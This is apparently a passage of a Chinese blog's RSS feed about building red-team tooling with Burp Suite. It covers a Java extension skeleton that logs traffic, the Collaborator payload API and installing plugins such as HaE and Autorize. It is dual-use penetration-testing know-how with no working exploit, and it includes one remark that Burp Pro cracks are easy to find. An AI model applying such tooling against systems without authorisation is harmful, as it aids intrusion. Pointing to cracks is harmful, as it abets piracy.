style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;​&lt;/span&gt;    stdout &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; PrintWriter(callbacks.&lt;span style=&#34;color:#a6e22e&#34;&gt;getStdout&lt;/span&gt;(), &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;​&lt;/span&gt;    callbacks.&lt;span style=&#34;color:#a6e22e&#34;&gt;registerHttpListener&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;​&lt;/span&gt;    callbacks.&lt;span style=&#34;color:#a6e22e&#34;&gt;registerProxyListener&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;​&lt;/span&gt;    callbacks.&lt;span style=&#34;color:#a6e22e&#34;&gt;registerScannerListener&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;​&lt;/span&gt;    callbacks.&lt;span style=&#34;color:#a6e22e&#34;&gt;registerScopeChangeListener&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;​&lt;/span&gt;    callbacks.&lt;span style=&#34;color:#a6e22e&#34;&gt;registerExtensionStateListener&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;@Override&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;processHttpMessage&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; toolFlag, &lt;span style=&#34;color:#66d9ef&#34;&gt;boolean&lt;/span&gt; messageIsRequest, IHttpRequestResponse messageInfo)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;​&lt;/span&gt;    stdout.&lt;span style=&#34;color:#a6e22e&#34;&gt;println&lt;/span&gt;(&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;​&lt;/span&gt;        (messageIsRequest &lt;span style=&#34;color:#f92672&#34;&gt;?&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;HTTP request to &amp;#34;&lt;/span&gt; : &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;HTTP response from &amp;#34;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;​&lt;/span&gt;        messageInfo.&lt;span style=&#34;color:#a6e22e&#34;&gt;getHttpService&lt;/span&gt;() &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;​&lt;/span&gt;        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; [&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; callbacks.&lt;span style=&#34;color:#a6e22e&#34;&gt;getToolName&lt;/span&gt;(toolFlag) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;]&amp;#34;&lt;/span&gt;);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;@Override&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;processProxyMessage&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;boolean&lt;/span&gt; messageIsRequest, IInterceptedProxyMessage message)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;​&lt;/span&gt;    stdout.&lt;span style=&#34;color:#a6e22e&#34;&gt;println&lt;/span&gt;(&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;​&lt;/span&gt;        (messageIsRequest &lt;span style=&#34;color:#f92672&#34;&gt;?&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Proxy request to &amp;#34;&lt;/span&gt; : &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Proxy response from &amp;#34;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;​&lt;/span&gt;        message.&lt;span style=&#34;color:#a6e22e&#34;&gt;getMessageInfo&lt;/span&gt;().&lt;span style=&#34;color:#a6e22e&#34;&gt;getHttpService&lt;/span&gt;());&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;@Override&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;newScanIssue&lt;/span&gt;(IScanIssue issue)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;​&lt;/span&gt;    stdout.&lt;span style=&#34;color:#a6e22e&#34;&gt;println&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;New scan issue: &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; issue.&lt;span style=&#34;color:#a6e22e&#34;&gt;getIssueName&lt;/span&gt;());&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;@Override&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;extensionUnloaded&lt;/span&gt;()&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;​&lt;/span&gt;    stdout.&lt;span style=&#34;color:#a6e22e&#34;&gt;println&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Extension was unloaded&amp;#34;&lt;/span&gt;);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;@Override&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;scopeChanged&lt;/span&gt;() {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;​&lt;/span&gt;    stdout.&lt;span style=&#34;color:#a6e22e&#34;&gt;println&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ScopeChanged!&amp;#34;&lt;/span&gt;);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;其实带有图形化的插件和正常的Java程序差不多，开发过程也就和Java差不多，我们再来看看添加右键菜单。效果如下图所示：&lt;/p&gt;</description>
    </item>
    <item>
      <title>红队基础设施建设与改造（三）——武装你的Burpsuite（中）</title>
      <link>http://localhost:1313/posts/%E7%BA%A2%E9%98%9F%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E5%BB%BA%E8%AE%BE%E4%B8%8E%E6%94%B9%E9%80%A0%E4%B8%89%E6%AD%A6%E8%A3%85%E4%BD%A0%E7%9A%84burpsuite%E4%B8%AD/</link>
      <pubDate>Fri, 08 Jan 2021 11:25:18 +0800</pubDate>
      <guid>http://localhost:1313/posts/%E7%BA%A2%E9%98%9F%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E5%BB%BA%E8%AE%BE%E4%B8%8E%E6%94%B9%E9%80%A0%E4%B8%89%E6%AD%A6%E8%A3%85%E4%BD%A0%E7%9A%84burpsuite%E4%B8%AD/</guid>
      <description>&lt;p&gt;&lt;strong&gt;本文所述的一切技术仅供网络安全研究学习之用，请勿用于任何的违法用途，否则由此所产生的一切后果自负！&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;Burp的基础插件安装已经在上一篇文章中讲了，本篇主要讲BP插件的开发，毕竟别人的东西用起来还是自己写的香。本来这篇文章是准备全写完再发出来，但是发现内容真的有亿点点多还是决定拆一下。&lt;/p&gt;&#xA;&lt;p&gt;BP插件的开发语言支持Java和Python，由于BP本来就是Java开发的所以对Java的插件支持也更好，我们在后面的文章中JAVA开发和Python开发都会讲到。在找了半天资料后发现官方给出了一个&lt;a href=&#34;https://portswigger.net/burp/extender/api/index.html&#34;&gt;链接&lt;/a&gt;,这个连接中的文档描述了各种编写规则&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps86.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;还给出了一些&lt;a href=&#34;https://portswigger.net/burp/extender/&#34;&gt;实例&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;首先来讲讲BP开发的基础，了解一下API，来解读一下官方文档&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps87.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;第一个Interface IBurpCollaboratorClientContext&lt;/p&gt;&#xA;&lt;p&gt;这个接口用于生成payload并与collaborator服务器交互，通过轮询来得到网络交互的数据包。该类接口包含有以下方法，可以接收返回，生成payload，得到collaborator服务器地址等&lt;/p&gt;&#xA;&lt;table&gt;&#xA;  &lt;thead&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;th&gt;Modifier and Type&lt;/th&gt;&#xA;          &lt;th&gt;Method and Description&lt;/th&gt;&#xA;      &lt;/tr&gt;&#xA;  &lt;/thead&gt;&#xA;  &lt;tbody&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;java.util.List&amp;lt;&lt;a href=&#34;https://portswigger.net/burp/extender/api/burp/IBurpCollaboratorInteraction.html&#34;&gt;IBurpCollaboratorInteraction&lt;/a&gt;&amp;gt;&lt;/td&gt;&#xA;          &lt;td&gt;&lt;a href=&#34;#fetchAllCollaboratorInteractions()&#34;&gt;fetchAllCollaboratorInteractions&lt;/a&gt;() This method is used to retrieve all interactions received by the Collaborator server resulting from payloads that were generated for this context.&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;java.util.List&amp;lt;&lt;a href=&#34;https://portswigger.net/burp/extender/api/burp/IBurpCollaboratorInteraction.html&#34;&gt;IBurpCollaboratorInteraction&lt;/a&gt;&amp;gt;&lt;/td&gt;&#xA;          &lt;td&gt;&lt;a href=&#34;#fetchAllInfiltratorInteractions()&#34;&gt;fetchAllInfiltratorInteractions&lt;/a&gt;() This method is used to retrieve all interactions made by Burp Infiltrator instrumentation resulting from payloads that were generated for this context.&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;java.util.List&amp;lt;&lt;a href=&#34;https://portswigger.net/burp/extender/api/burp/IBurpCollaboratorInteraction.html&#34;&gt;IBurpCollaboratorInteraction&lt;/a&gt;&amp;gt;&lt;/td&gt;&#xA;          &lt;td&gt;&lt;a href=&#34;#fetchCollaboratorInteractionsFor(java.lang.String)&#34;&gt;fetchCollaboratorInteractionsFor&lt;/a&gt;(java.lang.String payload) This method is used to retrieve interactions received by the Collaborator server resulting from a single payload that was generated for this context.&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;java.util.List&amp;lt;&lt;a href=&#34;https://portswigger.net/burp/extender/api/burp/IBurpCollaboratorInteraction.html&#34;&gt;IBurpCollaboratorInteraction&lt;/a&gt;&amp;gt;&lt;/td&gt;&#xA;          &lt;td&gt;&lt;a href=&#34;#fetchInfiltratorInteractionsFor(java.lang.String)&#34;&gt;fetchInfiltratorInteractionsFor&lt;/a&gt;(java.lang.String payload) This method is used to retrieve interactions made by Burp Infiltrator instrumentation resulting from a single payload that was generated for this context.&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;java.lang.String&lt;/td&gt;&#xA;          &lt;td&gt;&lt;a href=&#34;#generatePayload(boolean)&#34;&gt;generatePayload&lt;/a&gt;(boolean includeCollaboratorServerLocation) This method is used to generate new Burp Collaborator payloads.&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;java.lang.String&lt;/td&gt;&#xA;          &lt;td&gt;&lt;a href=&#34;#getCollaboratorServerLocation()&#34;&gt;getCollaboratorServerLocation&lt;/a&gt;() This method is used to retrieve the network location of the Collaborator server.&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;  &lt;/tbody&gt;&#xA;&lt;/table&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps88.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>红队基础设施建设与改造（三）——武装你的Burpsuite（上）</title>
      <link>http://localhost:1313/posts/%E7%BA%A2%E9%98%9F%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E5%BB%BA%E8%AE%BE%E4%B8%8E%E6%94%B9%E9%80%A0%E4%B8%89%E6%AD%A6%E8%A3%85%E4%BD%A0%E7%9A%84burpsuite%E4%B8%8A/</link>
      <pubDate>Wed, 16 Dec 2020 11:04:32 +0800</pubDate>
      <guid>http://localhost:1313/posts/%E7%BA%A2%E9%98%9F%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E5%BB%BA%E8%AE%BE%E4%B8%8E%E6%94%B9%E9%80%A0%E4%B8%89%E6%AD%A6%E8%A3%85%E4%BD%A0%E7%9A%84burpsuite%E4%B8%8A/</guid>
      <description>&lt;p&gt;&lt;strong&gt;本文所述的一切技术仅供网络安全研究学习之用，请勿用于任何的违法用途，否则由此所产生的一切后果自负！&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;Burpsuite作为抓包利器，深受安全人员的喜爱。免费的community版本只有非常少的一些功能，而很多功能都在Pro版中，虽然基础功能都能实现，但是Burpsuite就是以强大的模块化拓展功能著称，就像常见的Goby, CS 和蚁剑等工具都非常适合模块化的拓展开发。如此强大的神器在不同版本究竟有什么差异呢，我们先来官网看一看。&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps38.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;可以看到企业版卖到了3999刀一年，而正常情况下的专业版也是399刀一年。其中专业版的功能支持多了Web vulnerability scanner、Advanced manual tools和Essential manual tools。&lt;/p&gt;&#xA;&lt;p&gt;下面是官网给出的功能解释截图，大家自己看一下就好，我懒得翻译了，顺便说一句：一定要好好学英语。我是不会告诉你们我是好几个技术项目的翻译支持的（有合作意向的大佬除外，兼职翻译欢迎小窗。）&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps39.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps40.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps41.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;破解方法网上一搜一大堆，在这里就不多BB了，当然你也可以选择支持正版。下面我们进入正题，开始本篇的重点部分：武装Burpsuite。&lt;/p&gt;&#xA;&lt;p&gt;本篇的介绍环境如下：&lt;/p&gt;&#xA;&lt;p&gt;Burpsuite Pro 2020.7&lt;/p&gt;&#xA;&lt;p&gt;Java 14.0.2 2020-07-14&lt;/p&gt;&#xA;&lt;p&gt;因为新版的Burp好像不支持Java8了，之前用的BP1.7版本还是用的Java8。新版本的Burpsuite反正我觉得界面长的还可以。主界面如下：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps42.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;新增的功能是内置的浏览器，不用再像以前一样测试的时候浏览器和Burp疯狂切换了。&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps43.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;Burpsuite的武装主要是支持拓展的部分也就是模块化的拓展，在Extender模块部分可以看到当前已安装的拓展，为了演示需要我这边找了一个白板Burp&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps44.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;Burp的插件支持本地加载和商店直接下载，我们先来看看商店中的实用拓展：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps45.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;以第一个插件为例，讲讲如何从商店中安装插件，首先选中插件，将右侧栏的滚动条拖到底可以看到install按钮&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps46.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;点击install后就开始了安装&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps47.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;安装成功后可看到installed栏下勾上了&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps48.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;不过这玩意的效果好像比较难演示，效果演示我们就放到后面的内容中去。知道了插件的基础安装过程，接下来就是武装的过程了。&lt;/p&gt;&#xA;&lt;p&gt;以下介绍的插件为我自己Burp中安装的一些常用插件，在渗透测试或挖洞时能让工作方便不少。&lt;/p&gt;&#xA;&lt;h2 id=&#34;hae&#34;&gt;&lt;em&gt;HaE&lt;/em&gt;&lt;/h2&gt;&#xA;&lt;p&gt;2024补充，Key师傅开发的插件，&lt;del&gt;有非常多的策略可以用于各种测试&lt;/del&gt;，总之就是非常牛逼！！！牛逼！！还有不断更新的&lt;a href=&#34;https://raw.githubusercontent.com/gh0stkey/HaE/gh-pages/Rules.yml&#34;&gt;规则库&lt;/a&gt;，&#xA;使用效果如下（图是网上偷的，自己挖的洞太牛逼了就不放了）：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/1362876-20240520150051446-910956326.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;h2 id=&#34;autorize&#34;&gt;&lt;em&gt;Autorize&lt;/em&gt;&lt;/h2&gt;&#xA;&lt;p&gt;这是一款强大的自动化越权测试工具，在商店中就可以下载。但是这款工具在安装过程中就要开始踩坑了，并不是直接安装就可以的，为了演示还特地起了一台没环境的虚拟机。&lt;/p&gt;&#xA;&lt;p&gt;在这款工具的安装中我们可以看到需要安装Jython，因为该插件通过Python来进行支持，&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps49.jpg&#34; 